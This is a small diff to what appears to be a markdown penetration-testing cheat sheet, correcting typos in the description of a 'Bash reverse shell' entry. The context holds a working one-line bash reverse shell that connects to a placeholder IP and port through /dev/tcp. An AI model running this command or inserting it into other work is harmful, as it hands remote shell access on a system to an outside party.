@@ -114,7 +114,8 @@ cat /proc/cpuinfo
 ```
 
 **Bash reverse shell** (@icleus)
-Works on all distrobutions where egress filtering is not in place / quiet open, use this to reverse connect to your lsitening host.
+
+Works on all (recent) distrobutions where egress filtering is not in place / quite open, use this to reverse connect to your listening host.
 
 ```bash
 bash -i>& /dev/tcp/123.123.123.123/1234 0>&1 &
